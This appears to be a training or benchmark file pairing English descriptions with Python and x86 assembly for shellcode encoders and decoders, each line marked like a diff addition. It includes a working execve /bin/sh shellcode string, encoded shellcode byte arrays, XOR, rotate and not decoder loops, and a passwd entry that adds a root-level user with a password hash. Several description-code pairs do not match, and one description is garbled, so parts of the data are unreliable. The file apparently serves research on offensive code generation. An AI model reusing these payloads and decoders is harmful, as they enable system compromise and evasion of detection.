+assign var0 value of var0 left shift by var2 minus var3 </s> var0 = var0 >> var2 - var3
+left shift x by var0 plus var1 and assign result to var2 </s> var2 = x << var0 + var1
+result is concatenation of string var0, hexadecimal value of length of array of bytes of variable sc and string var1 </s> result = '\\x%02x, ' % len ( bytearray ( sc ) )
+return tuple with 3 elements: var0 var1 and stream. </s> return var0 , var1 , stream
+return result of var0 left shift of n and temp var0 and var4 var0 or with var0 right shift of n by subtraction of temp from width </s> return n << temp & var4 | n >> width - temp
+return result of var0 right shift of n and rotations xor var0 left shift of n and subtract rotations from width var0 and var3 </s> return n >> rotations ^ n << width - rotations & var3
+return n right shift by rotations var0 or with result of n left shift by width var0 and var2 </s> return [ Warning ( 'BooleanField does not have a default value.' , hint = 'Django 1.6 changed the default value of BooleanField from False to None.See https://docs.djangoproject.com/en/1.6/ref/models/fields/#booleanfield for more information.' , obj = field , id = '1_6.W002' ) for field in problem_fields ]
+return 2 to power of n minus 1 </s> return 2 ** n - 1
+return var0 </s> return i
+if filename ends with string var0 return var1 otherwise return var3  </s> return var1 if filename . endswith ( var0 ) else var3
+return msgs. </s> return msgs
+return name. </s> return name
+call method var0 substitute result for var1  </s> var1 = var0 ( )
+substitute element at self.pos index of var0 for var1  </s> var1 = var0 [ self . pos ]
+store in var0 reverse of array var1 </s> var0 = var1 [ : : - 1 ]
+substitute complain for reverse. </s> reverse = complain
+and lambda function with 2 arguments: self and other, resulting boolean var0 if self is lesser var7 other or self is equal to other var19 tuple with 2 elements: string var42 var19 and lambda function with 2 arguments: self and other, resulting boolean var46 if self is lesser var7 other or self is equal to other var19 tuple with 2 elements: string var51 var19 and lambda function with 2 arguments: self and other, resulting boolean var0 if self is lesser var7 other, for var56 var19 list with 3 tuples: tuple with 2 elements: string var51 var19 and lambda function with 2 arguments: self and other, resulting boolean var0 if self is lesser var7 or equal to other var19 or self is equal to other, tuple with 2 elements: string var56 var19 and lambda function with 2 arguments: self and other, resulting boolean var46 if self is lesser var7 or equal to other var19 or self is not equal to other, tuple with 2 elements: string var63 var19 and lambda function with 2 arguments: self and other, resulting boolean var0 if self is lesser var7 or equal to other, for var42 var19 list with 3 tuples: tuple with 2 elements: string var56 var19 and lambda function with 2 arguments: self and other, resulting boolean var0 if self is greater var7 other or self is equal to other var19 tuple with 2 elements: string var51 var19 and lambda function with 2 arguments: self and other, resulting boolean var46 if self is greater var7 other or self is equal to other var19 tuple with 2 elements: string var42 var19 and lambda function with 2 arguments: self and other, resulting boolean var0 if self is greater var7 other, for var63 var19 and list with 3 tuples: tuple with 2 elements: string var42 var19 and lambda function with 2 arguments: self and other, resulting boolean var46 if self is not greater var7 or is not equal to other var19 or self is equal to other, tuple with 2 elements: string var63 var19 and lambda function with 2 arguments: self and other, resulting boolean var46 if self is greater var7 or not equal to other var19 or self is not equal to other, tuple with 2 elements: string var56 var19 and lambda function with 2 arguments: self and other, resulting boolean var0 if self is greater var7 or equal to other, for var51 var19 convert cls to dict, convert result into set and convert convert into set, roots is set of differences of two previous sets. </s> roots = set ( dir ( cls ) ) & set ( convert )
+ROT is first command-line argument converted to integer </s> ROT = int ( sys . argv [ 1 ] )
+assign var0 var1 var2 or var3 </s> var0 = var1 | var3
+append string var0 followed by conversion in hex of var1 to string s </s> s += '\\x%02x' % 0xAA
+set s to string var0 </s> s = var0
+assign sb hexadecimal value of leader casted into var0 </s> sb = int ( hex ( leader ) , 16 )
+append to sc bytes object containing value var0 packed according to format string unsigned char </s> sc . append ( struct . pack ( 'B' , var0 ) )
+call function var0 with argument url, assign result to scheme var1 path, query and fragment, respectively. </s> scheme , var1 , path , query , fragment = var0 ( url )
+call method var0  </s> var0 ( )
+convert var0 to var1 and store its length in variable var2 </s> shell_len = len ( var1 ( var0 ) )
+concatenate in string var0 concatenation of var1 and string byte encoded in hexadecimal </s> var0 += var1 + byte . encode ( 'hex' )
+Convert value of x var0 and var1 to hexadecimal then add it to variable var2 </s> var2 += '%02x' % ( x & var1 )
+remove first 3 items from var0 </s> var0 = var0 [ 3 : ]
+Declare string var0 and add string var1 into it </s> var0 = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
+assign variable var0 hexadecimal values of var1 separated by string var4 </s> var0 = '' . join ( '\\x{:02x}' . format ( x ) for x in var1 )
+store in variable var0 hexadecimal values of var1 separated by string var3 and remove any trailing var4 </s> var0 = '' . join ( '0x{:02x}, ' . format ( i ) for i in var1 ) . rstrip ( ', ' )
+append to variable var0 value of var1 at index i xor variable r </s> var0 . append ( var1 [ i ] ^ r )
+append to variable var0 value of var1 at index var3 xor variable r </s> var0 . append ( var1 [ i + 1 ] ^ r )
+read file f as var0 from hexadecimal values remove var1 and replace all var2 of string var3 with var4 " and store result in var5 </s> var5 = var0 . fromhex ( f . read ( ) . strip ( ) . replace ( '\\t' , '' ) )
+assign variable var0 hexadecimal values of var1 separated by string var4 </s> var0 = '' . join ( '\\x{:02x}' . format ( x ) for x in var1 )
+append 0x70 to var0 </s> var0 . append ( 112 )
+shells is list containing 2 elements: string var0 and string var1. </s> shells = [ var0 , 'bpython' ]
+if value is instance of var0 and settings var1 if var2 is var6 else var2 and call to function var7  </s> should_convert = isinstance ( value , var0 ) and ( settings . var1 if var2 is var6 else var2 ) and not var7 ( value ) and getattr ( value , 'convert_to_local_time' , True )
+append string var1 to var0 </s> var0 += var1
+Convert value of z var0 and var1 to hexadecimal then add it to variable var2 followed by var3 </s> var2 += '%02x, ' % ( z & var1 )
+add string value var1 to variable var0 </s> var0 += var1
+var0 is empty string </s> var0 = ''
+initialize variable var0 to empty string </s> var0 = ''
+append var0 to var1 </s> var1 = var1 + var0
+add to var0 bytes object containing value var1 packed according to format string unsigned char </s> var0 . append ( struct . pack ( 'B' , var1 ) )
+append string var0 to var1 </s> var1 += var0
+add string value var0 to variable var1 </s> var1 += '\\x'
+var0 is string containing hexadecimal conversion of var1 </s> var0 = '%02x' % var1
+var0 is string var1 </s> var0 = ''
+add to var0 bytes object containing value var1 packed according to format string unsigned char </s> var0 . append ( struct . pack ( 'B' , var1 ) )
+convert shift to hexadecimal and append it followed by var0 to string var1 </s> var1 += '%02x, ' % shift
+convert var0 in hexadecimal and append it followed by var1 to string var2 </s> var2 += '%02x, ' % var0
+substitute str for var0  </s> var0 = str ,
+call function var0 with argument var1 substitute result for var1  </s> var1 = var0 ( var1 )
+substitute style var0 for style var1  </s> style . var0_OUTPUT = style . var0
+call function var0 convert result to list, append string var2 to it, substitute it for var3  </s> var3 = list ( var0 ( ) ) + [ var2 ]
+substitute var0 filed of base class of class var1 for var2  </s> var2 = super ( var1 , self ) . var0
+var0 is boolean var1  </s> var0 = var1
+separate every 2 characters of string swapped with separator var0 </s> swapped = ', ' . join ( swapped [ i : i + 2 ] for i in range ( 0 , len ( swapped ) , 2 ) )
+add var0 to every 2 characters of string swapped </s> swapped = '0x' . join ( swapped [ i : i + 2 ] for i in range ( 0 , len ( swapped ) , 2 ) )
+convert values of swapped to var0 </s> swapped = binascii . hexlify ( bytearray ( swapped ) )
+open var0 file in append mode with buffering size of input buffer, substitute result for var1  </s> var1 = open ( var0 , 'a' , buffering )
+exit program with code 0 </s> sys . exit ( 0 )
+decrement t by integer 1, </s> t -= 1
+call method self var1 substitute result for var2  </s> var2 = self . var1 ( )
+integer 0 and integer 0 var0 try, </s> try:
+append to string var0 value (7 - (256 -x)) converted to hexadecimal </s> var0 += '%02x' % ( 7 - ( 256 - x ) )
+convert (x+7) to hexadecimal and append it to string var0 </s> var0 += '%02x' % ( x + 7 )
+for each element in var convert element to integer representing var0 then convert it to hexadecimal ignore slice at index 2 var1 end and join separating each element by string var2 </s> val = '' . join ( '\\x{}' . format ( hex ( ord ( x ) ) [ 2 : ] ) for x in var )
+subtract 1 from 2 to power of var0 and assign result to var1 </s> var1 = 2 ** var0 - 1
+call function var0 with argument var1 and save return value in var2 </s> var2 = var0 ( var1 )
+assign var1 hexadecimal value of variable byte converted to var2 xor with variable i </s> var1 = int ( byte . encode ( 'hex' ) , var016 ) ^ i
+call method var0 with 2 arguments: context and boolean var1 substitute result for var2  </s> val1 = var0 ( context , var1 )
+var0 is result of var1 xor between integer base 32 of element i of chunk encoded to hex and var2 </s> var0 = int ( chunk [ i ] . encode ( 'hex' ) , 32 ) ^ var2
+call method parser var1 with argument, third element of bits, substitute result for var2  </s> var2 = parser . var1 ( bits [ 2 ] )
+add string value var0 to variable var </s> var += '\\x'
+Convert variable rand to hexadecimal and add it to variable var </s> var += '\\x%02x' % rand
+append var0 to var </s> var += var0
+add bytes literal var0 to variable var </s> var += b'\x0a\x1b\x2c\x3d\x4e\x5f\x6a\x10\x56\x57\x68\x99\xa5'
+add bytes literal var0 to variable var </s> var += b'\x5b\x37\x42\x01\xbd\x3c\x72\x7c\x02\x3d\x5f\xc1\xcf'
+add bytes literal var0 to variable var </s> var += b'\x90\x4a\x5c\xf3\x1e\x81\x69\x14\x75\x72\xde\xac\x77'
+add bytes literal var0 to variable var </s> var += b'\x99\xaf\xbb\xed\xbe\x46\x56\x4e\x88\x72\x53\x44\x68'
+add bytes literal var0 to variable var </s> var += b'\xae\xf2\xc4\xbb\x03\x41\xcd\x8b\x52\x10\x8b\x4a\x3c'
+Convert value of var0 to hexadecimal, then slice it between var1 2 and 3, convert it to var2 and add its value to var1 </s> var1 = int ( hex ( var0 ) [ 2 : 3 ] , 16 )
+var0 is integer 0. </s> var0 = 0
+endless loop, </s> while True : 
+while x is greater var0 zero, </s> while x > 0 : 
+subtract decimals from digits, substitute result for var0  </s> var0 = digits - decimals
+open var0 file in write mode, with file descriptor as var1 perform following, </s> with open ( var0 , 'wb' ) as var1 : 
+append to string x hexadecimal conversion of and operation between and var0 </s> x += '%02x' % ( a & var0 )
+append to string encoded hexadecimal conversion of and operation between y and var0 </s> x += '%02x' % ( a & var0 )
+perform and operation between y and var0 then convert result in hexadecimal and append it to string x </s> x += '%02x' % ( y & var0 )
+add 1 to x </s> x += 1
+Convert value of y to hexadecimal, then slice it at index 3 and add its value to x </s> x += hex ( y ) [ 3 : ]
+Slice y at index 3 and add its value to x </s> x += y [ 3 : ]
+Convert value of y to hexadecimal, then slice it at index 3 and add value to x </s> x += y [ 3 : ]
+Convert variable x to hexadecimal and store it in variable x </s> x = '%02x' % x
+initialize empty string variable called x </s> x = ''
+store variable x value of function var0 with x and rand as parameters </s> x = var0 ( x , rand )
+perform left shift on x by n, then store result in x </s> x = x << nbits
+in x replace var0 with bytes object containing value y packed according to format string unsigned char </s> x = x . replace ( '\x45' , struct . pack ( 'B' , y ) )
+assign variable x value of x xor 0xDD </s> x = x ^ 221
+assign var0 value of function var1 with chunk and var3 as parameters </s> var0 = var1 ( chunk , var3 )
+Take absolute value of var0 then convert var0 to integer, then cast to hexadecimal, slice variable var2 between var4 0 and 2 then cast var2 to type var5 store value of summation in variable xxx </s> xxx = hex ( int ( abs ( var0 ) ) + int ( var2 [ 0 : 2 ] , 32 ) )
+Convert variable x to hexadecimal and store it in variable y </s> y += '%02x' % x
+append value x converted in hex to string y </s> y += '%02x' % x
+assign variable y var0 of variable var2 at index 0 var4 xor var0 of var2 at index 1 </s> y = var0 ( var2 ) [ 0 ] ^ var0 ( var2 ) [ 1 ]
+assign variable y to x var0 xor var1 of var2 at index n </s> y = x ^ var1 ( var2 ) [ n ]
+Convert variable x to hexadecimal and add it to variable z followed by var0 </s> z += '%02x, ' % x
+append value y converted to hex to string z </s> z += '%02x' % y
+var0 is instance of var1 class. </s> var0 = var1 ( )
+define the _egg label </s> _egg :
+define the _file label </s> _file :
+define the _param label </s> _param :
+_start function </s> _start :
+add 0x40 to the al register </s> add al , 0x40
+add the value 2 to the contents of the al register </s> add al , 2
+add the contents of bx into ax </s> add ax , bx
+add the byte value 2 to the esi register </s> add byte [esi] , 2
+add 30 to the single byte stored at memory address var </s> add byte [var] , 30
+add 3 to ecx and jump to L3 if the sum is not zero </s> add eax , 3 \n jnz L3
+add decimal 48 to eax </s> add eax , 48
+add the contents of ebx to the contents of eax </s> add eax , ebx
+add 0x2 to the contents in ebx and save the result in ebx </s> add ebx , 0x2
+add the value 1 into the ecx register </s> add ecx , 1
+add 4 to the contents of the esi register </s> add esi , 4
+call the _myfunc function </s> call _myfunc
+call the cont function </s> call cont
+call the function decoder </s> call decoder
+call set_argv </s> call set_argv
+call writestring </s> call writestring
+define call_decoder function </s> call_decoder :
+define call_shellcode label </s> call_shellcode :
+define call_shellcode function </s> call_shellcode :
+define the call_write label </s> call_write :
+define the child function </s> child :
+if the contents of the al register is not equal to the contents of the cl register then jump short to the decode label else jump to the shellcode label </s> cmp al , cl \n jne short decode \n jmp shellcode
+jump to the l3 label if the contents of the ax register is not equal to the contents of the bx register </s> cmp ax , bx \n jne l3
+if the contents of the bl register is equal to the value 0xaa then jump to the shellcode label </s> cmp bl , 0xaa \n je shellcode
+if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label </s> cmp bl , 0xbb \n je xordecode \n jmp notdecode
+if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7 then jump to the lowbound label </s> cmp BYTE [esi] , 0x7 \n jle lowbound
+if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label </s> cmp byte [esi] , 0xD \n jle wrap_around
+jump to the label loop_1 if the first byte of the esi register is not equal to the contents of the bl register </s> cmp BYTE bl , [esi] \n jne loop_1
+if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270 then jump to the while label </s> cmp DWORD [edx] , 0x636f7270 \n je while
+define cycle label </s> cycle :
+in D1 move the current byte of the shellcode in the bl register </s> D1 : \n mov bl , byte [esi]
+declare the function D2 and negate the byte in esi </s> D2 : \n not byte [esi]
+declare the ruotine D3 and add the value 8 to the current byte of the shellcode </s> D3 : \n add byte [esi] , 8
+define function D3 and subtract 7 from the current byte of the shellcode </s> D3 : \n sub byte [esi] , 7
+in D4 store the shellcode in edi and move the pointer into esi </s> D4 : \n pop esi \n mov edi , esi
+define the function D4 and perform the xor operation between the byte in esi and the 0x5 value </s> D4 : \n xor byte [esi] , 0x5
+decrement the bl register and jump to L1 if the result is zero </s> dec bl \n jz L1
+decrement the contents of the cl register and jump to the loop_dup label if the result is not negative </s> dec cl \n jns loop_dup
+decrement dl and jump to L3 if the result is not zero </s> dec dl \n jnz L3
+decrement dl and jump to L3 if the result is zero </s> dec dl \n jz L3
+decrement ebx </s> dec ebx
+decrease ecx by 1 </s> dec ecx
+decrement esp </s> dec esp
+define decode_pr label </s> decode_pr :
+define decode function </s> decode :
+declare the decode label </s> decode :
+define decoded_shellcode function </s> decoded_shellcode :
+define decoder label </s> decoder :
+declare the decrypt label </s> decrypt :
+divide eax by ecx </s> div ecx
+declare the enc label </s> enc :
+define the array of bytes encodedshellcode and initialize it to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce </s> encodedshellcode : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce
+define the array of bytes encodedshellcode and initialize it to 0x4e,0xc1,0x51,0x2f,0x58,0x3c,0xdb,0xac,0xef,0x82,0xef,0x1c,0x2a,0xd9,0xdb,0x90,0xdb,0x6b,0xef,0x61,0x3b,0x1c,0xcb,0x24,0xfb,0xd6,0xc5,0x50,0x23,0xfa,0x58,0x9c,0xc5,0xb1,0x33,0x97,0x28,0x31,0xc5,0xaa,0x43,0xf9,0x56,0xf4,0xad,0xc2,0x02,0x16,0x55,0xe3 </s> encodedshellcode : db 0x4e , 0xc1 , 0x51 , 0x2f , 0x58 , 0x3c , 0xdb , 0xac , 0xef , 0x82 , 0xef , 0x1c , 0x2a , 0xd9 , 0xdb , 0x90 , 0xdb , 0x6b , 0xef , 0x61 , 0x3b , 0x1c , 0xcb , 0x24 , 0xfb , 0xd6 , 0xc5 , 0x50 , 0x23 , 0xfa , 0x58 , 0x9c , 0xc5 , 0xb1 , 0x33 , 0x97 , 0x28 , 0x31 , 0xc5 , 0xaa , 0x43 , 0xf9 , 0x56 , 0xf4 , 0xad , 0xc2 , 0x02 , 0x16 , 0x55 , 0xe3
+declare the encrypt label </s> encrypt :
+define execfile function </s> execfile :
+declare the execute label </s> execute :
+define F1 and call the function function_1 </s> F1 : \n call function_1
+in the function F1 jump to label L1 if the current byte of the shellcode is lower than 0x1 else subtract 0x1 from the byte of the shellcode and jump to L2 </s> F1 : \n cmp byte [esi] , 0x1 \n jl L1 \n sub byte [esi] , 0x1 \n jmp L2
+in the function F1 point to the next byte in esi </s> F1 : \n inc esi
+in the function F1 point to the next word in esi </s> F1 : \n inc esi \n inc esi
+define F1 function and jump short to L1 </s> F1 : \n jmp short L1
+in the function F1 negate cl and increment cl to the next byte </s> F1 : \n not cl \n inc cl
+define F1, negate cl and increment cl to the next byte </s> F1 : \n not cl \n inc cl
+define F1, negate cl and point to the next byte in the cl register </s> F1 : \n not cl \n inc cl
+define the function F1 and store the encoded shellcode pointer in the esi register </s> F1 : \n pop esi
+declare the function F1 and save in esi the pointer to the shellcode </s> F1 : \n pop esi
+declare the function F1 and point the shellcode in esi </s> F1 : \n pop esi
+in the function F1 point to the next byte of the edi and jump short to L1 </s> F1 : inc edi \n jmp short L1
+define format label </s> format :
+define formatting label </s> formatting :
+declare the four label </s> four :
+declare the get label </s> get :
+declare global _start </s> global _start
+increment the contents of the dx register </s> inc dx
+increment the address in eax by one byte </s> inc eax
+increment eax </s> inc eax
+point to the next word in the eax register </s> inc eax \n inc eax
+move to the next word in eax </s> inc eax \n inc eax
+next instruction in the ecx register </s> inc ecx
+point to the next word in the ecx </s> inc ecx \n inc ecx
+increment the contents of the edi register </s> inc edi
+increment edx </s> inc edx
+point to the next byte in the edx register </s> inc edx
+move to the next double word in the edx register </s> inc edx \n inc edx \n inc edx \n inc edx
+increment esi </s> inc esi
+point to the next byte of the encoded shellcode </s> inc esi
+increment to the next byte of the shellcode </s> inc esi
+point to the next word of the shellcode </s> inc esi \n inc esi
+move to the next byte in the shellcode and jump to L2 </s> inc esi \n jmp L2
+point to the next byte of the shellcode and jump short to L1 </s> inc esi \n jmp short L1
+declare inc_dec function </s> inc_dec :
+jump to the data label </s> jmp data
+jump short to the call_decoder label </s> jmp short call_decoder
+jump short to the function call_shellcode </s> jmp short call_shellcode
+jump short to the call_write label </s> jmp short call_write
+jump short to the enc label </s> jmp short enc
+jump short to the get label </s> jmp short get
+jump short to the main label </s> jmp short main
+jump short to the output label </s> jmp short output
+jump short to the shellcode label </s> jmp short shellcode
+jump short to the three label </s> jmp short three
+jump to two </s> jmp two
+jump to 0x86 if the carry flag is zero </s> jnc 0x86
+if zero jump to the encoded label </s> jz encoded
+declare L4 and jump to the shellcode </s> L4 : \n call [esp]
+place the value ebx+4*esi in edi </s> lea edi , [ebx+4*esi]
+load the effective address of the result of the operation [esi + 13] into the edi register </s> lea edi , [esi+13]
+load the effective address [esi] into edi </s> lea edi , [esi]
+point edi to the next byte of the shellcode </s> lea edi , [esi+1]
+load the effective address [esi+4] into esi </s> lea esi , [esi+4]
+decrement ecx and jumps to the decode label unless decrementing ecx caused its value to become zero </s> loop decode
+decrement the count register and jump to decode if not equal zero </s> loop decode
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register </s> loop decode \n jmp edx
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the EncodedShellcode label </s> loop decode \n jmp EncodedShellcode
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the Shellcode label </s> loop decode \n jmp Shellcode
+decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label </s> loop decode \n jmp short shellcode
+decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero </s> loop decrypt
+decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register </s> loop eggLoop \n jmp edi
+declare the main_inc label </s> main_inc :
+declare the main label </s> main :
+move the contents of the al register into the edi register </s> mov [edi] , al
+move the contents of the al register into the esi register </s> mov [esi] , al
+move al into the address [esi+13] </s> mov [esi+13] , al
+move the byte at the address [esi] into al </s> mov al , byte [esi]
+move the byte in esi into the al register </s> mov al , byte [esi]
+move the byte at the memory location specified by the operation [esi+1+ebp] into al </s> mov al , byte [esi+1+ebp]
+move a byte from the address esi+ecx into al </s> mov al , byte [esi+ecx]
+move cl into al </s> mov al , cl
+move dl into al </s> mov al , dl
+move exit_call into al </s> mov al , exit_call
+move the contents at the address pointed by esi into the ax register </s> mov ax , [esi]
+move the memory offset table+esi*4 into ax </s> mov ax , table[esi*4]
+move 0x12 into bh </s> mov bh , 0x12
+move 0xe2 into bh </s> mov bh , 0xe2
+move the contents of memory address esi+ecx into bl </s> mov bl , [esi+ecx]
+move 0bh into bl </s> mov bl , 0bh
+move 0xff into bl </s> mov bl , 0xff
+move 1 into bl </s> mov bl , 1
+move the byte at the address [eax] into bl </s> mov bl , byte [eax]
+move the byte in edi into bl </s> mov bl , byte [edi]
+move the byte at the address [edi] into bl </s> mov bl , byte [edi]
+move the byte starting at the address [esi + eax + 1] into the bl register </s> mov bl , byte [esi+eax+1]
+move the byte in esi into bl </s> mov bl , byte [esi]
+move the byte at the address [esi] into bl </s> mov bl , byte [esi]
+move the byte at the address [esi+ecx+1] into bl </s> mov bl , byte [esi+ecx+1]
+move the byte in esi+ecx+1 into bl </s> mov bl , byte [esi+ecx+1]
+move the byte 0eh into bl </s> mov bl , byte 0eh
+move dl into bl </s> mov bl , dl
+move dl into the byte in eax </s> mov byte [eax] , dl
+move al into the byte at address [ebx + 35] </s> mov byte [ebx+35] , al
+move the the contents of the bl register into the byte starting at the address in edi </s> mov byte [edi] , bl
+move bl into the byte at address [edx + eax] </s> mov byte [edx+eax] , bl
+move bl into byte edx+eax </s> mov byte [edx+eax] , bl
+move the contents of dl into the byte at the memory location specified by the operation [esi+1] </s> mov byte [esi+1] , dl
+move al into the byte in esi </s> mov byte [esi] , al
+move al into the byte at address [esi+10] </s> mov byte [esi+10] , al
+move bl into the byte at address [esi+ecx] </s> mov byte [esi+ecx] , bl
+move bl into the single byte at the address stored in esi+ecx </s> mov byte [esi+ecx] , bl
+move 0x0a into the byte at address [esp] </s> mov byte [esp] , 0x0a
+move 0x2e into the byte at address [esp] </s> mov byte [esp] , 0x2e
+move 0x4 into ch </s> mov ch , 0x4
+move 0102 into cl </s> mov cl , 0102
+move 0x3 into cl </s> mov cl , 0x3
+move al into cl </s> mov cl , al
+move the byte in eax into cl </s> mov cl , byte [eax]
+move the byte at the address [esi] into cl </s> mov cl , byte [esi]
+move the 3rd element of the array byte_table into cl </s> mov cl , byte_table[2]
+move len into cl </s> mov cl , len
+move 0x35 into dh </s> mov dh , 0x35
+move 0xff into dh </s> mov dh , 0xff
+move 0x01 into dl </s> mov dl , 0x01
+move 0x20 into dl </s> mov dl , 0x20
+move 0xff into dl </s> mov dl , 0xff
+move the byte at the memory location specified by the operation [eax+1] into dl </s> mov dl , byte [eax+1]
+move the singl byte at the memory location specified by the operation [esi+1] into dl </s> mov dl , byte [esi+1]
+move the single byte in esi into dl </s> mov dl , byte [esi]
+move the byte 0ffh into dl </s> mov dl , byte 0ffh
+backup ebx into eax </s> mov eax , ebx
+move edi into eax </s> mov eax , edi
+move esp into ebp </s> mov ebp , esp
+move the contents of memory address ebx+esi into ebx </s> mov ebx , [ebx+esi]
+move 0x2 into ebx </s> mov ebx , 0x2
+move ebp into ecx </s> mov ecx , ebp
+move esp into ecx </s> mov ecx , esp
+move the contents of the esp register into the ecx register </s> mov ecx , esp
+move 0x3734b117 into edi </s> mov edi , 0x3734b117
+move 0x978cd0d0 into edi </s> mov edi , 0x978cd0d0
+move ecx to edi </s> mov edi , ecx
+move esi into edi </s> mov edi , esi
+move decimal 78 into edx </s> mov edx , 78
+move address of stack pointer into edx </s> mov edx , esp
+move hexlen into edx </s> mov edx , hexlen
+move the 16-bit integer representation of 2 into the 2 bytes starting at address ecx </s> mov word [ecx] , 2
+multiply eax by ecx </s> mul ecx
+define next_cycle label </s> next_cycle :
+do nothing </s> nop
+perform a bit-wise inversion of the byte starting at the address in esi </s> not byte [esi]
+negate all the bits of the word at the address ax </s> not word ax
+declare odd_numer function </s> odd_number :
+pop the last element pushed onto the stack into cx </s> pop cx
+pop the value on the stack back into edx </s> pop edx
+restore esi from the stack </s> pop esi
+restore the top of the stack into esi register </s> pop esi
+restore the top of the stack into the esi register </s> pop esi
+pop the top of the stack into the esi register </s> pop esi
+pop the value on the stack back into esi </s> pop esi
+get the address of shellcode </s> pop esi
+load address of the encoded shellcode into esi </s> pop esi
+pop the shellcode into esi </s> pop esi
+shellcode address in esi </s> pop esi
+shellcode on esi </s> pop esi
+store the shellcode in the esi register and copy it into ax </s> pop esi \n mov ax , [esi]
+save the encoded shellcode in esi and move it into bx </s> pop esi \n mov bx , [esi]
+point esi to the shellcode and save it into cx </s> pop esi \n mov cx , [esi]
+pop doublewords from the stack into the 32 bit registers </s> popad
+push esi to the stack </s> push esi
+push the contents of the esi register onto the stack and point ecx to the stack register </s> push esi \n mov ecx , esp
+declare retry label </s> retry :
+left rotate the byte in esi 1 time </s> rol byte [esi] , 0x1
+left rotate the edx register 4 times </s> rol edx , 0x4
+right rotate the byte in esi 1 time </s> ror byte [esi] , 0x1
+right rotate esi 1 time </s> ror esi , 1
+declare the shell label </s> shell :
+define shellcode label </s> shellcode :
+define the array of bytes shellcode and initialize it to vl43ck:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:0:0:vl43ck:/tmp:/bin/bash </s> shellcode : db 'vl43ck : $6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm . YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh . SF9aR7ciQBRCcw5bgjX0 : 0 : 0 : vl43ck : /tmp : /bin/bash'
+define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23 </s> shellcode : db 0x4b , 0xf7 , 0x13 , 0x59 , 0xcc , 0x8c , 0x63 , 0x5e , 0x9f , 0x8d , 0x99 , 0x9f , 0x1f , 0xa4 , 0x3b , 0x6e , 0xc6 , 0x36 , 0x23
+define shellcodelen equal to the length of shellcode </s> shellcodelen equ $-shellcode
+define shift_decode label </s> shift_decode :
+multiply the value of eax by 2 </s> shl eax , 1
+left shift the contents of eax register by 28 bit positions </s> shl eax , 28
+left shift the contents of ebx by 8 bits </s> shl ebx , 8
+multiply edx by 4 using left shift </s> shl edx , 2
+right shift ax by 1 bit </s> shr ax , 1
+right shift the contents of the edi register by the contents of the cl register </s> shr ax , cl
+right shift the contents of bl register by 4 bit positions </s> shr bl , 4
+right shift the contents of dl register by 1 bit positions </s> shr dl , 1
+right shift the contents of dl register by 4 bit positions </s> shr dl , 4
+shift right dx by the contents of bl and negate the byte in dx </s> shr dx , bl \n not byte dx
+right shift the contents of the eax register by 24 bit positions </s> shr eax , 24
+right shift the contents of eax register by 28 bit positions </s> shr eax , 28
+right shift the contents of the ebx register by the contents of the cl register </s> shr ebx , cl
+define stage label </s> stage :
+declare the stageaddress label </s> stageaddress :
+subtract 13 from ax and save the result into ax </s> sub ax , 13
+subtract 1564 from the contents of the ax register </s> sub ax , 1564
+subtract the contents of al register from the contents of bl register and save the result in bl </s> sub bl , al
+subtract 0x7 from the byte in esi register </s> sub bl , byte [esi]
+subtract the value 3 from the byte in esi and negate it </s> sub byte [esi] , 3 \n not byte [esi]
+subtract the value 1 from the contents of the cl register and jump to the decode label if the result is not zero </s> sub cl , 1 \n jnz decode
+subtract the contents of dl register from the contents of cl register and save the result in cl </s> sub cl , dl
+subtract the contents of cx from the contents of cx </s> sub cx , cx
+subtract the contents of the al register from the contents of the dl register and jump to the decode_pr label if the result is not negative </s> sub dl , al \n jns decode_pr
+subtract the contents of bx from the contents of dx </s> sub dx , bx
+subtract 0x10 from eax </s> sub eax , 0x10
+allocate memory for variable </s> sub esp , 4
+subtract the byte value 0x1 from esp register and save the result in esp </s> sub esp , byte 0x1
+if the contents of the eax register is zero then jump to the label socket </s> test eax , eax \n jz socket
+jump short to the label l1 if the contents of the ebx register is negative </s> test ebx , ebx \n js short l1
+test the contents of the edx register </s> test edx , edx
+swap the contents in ebp+16 and ecx </s> xchg [ebp+16] , ecx
+perform the xor operation between the al register and the value 0x4a </s> xor al , 0x4a
+perform a xor operation between ax and 0x539 and save the result in ax </s> xor ax , 0x539
+perform a logical xor between the bx register and the ax register and save the result in ax </s> xor ax , bx
+jump to the call_decoded label if the result of the logical xor between the ax register and the bx register is zero </s> xor ax , bx \n jz call_decoded
+jump to the encoded label if the result of the logical xor between the bl register and the value 0xBB is zero </s> xor bl , 0xBB \n jz encoded
+jump to the formatting label if the result of the logical xor between the bl register and the value 0xBB is zero </s> xor bl , 0xBB \n jz formatting
+initialize bx to 0 </s> xor bx , bx
+clear the bx register </s> xor bx , bx
+perform the xor operation between the byte starting at the addess in esi and the value 0x2c </s> xor byte [esi] , 0x2c
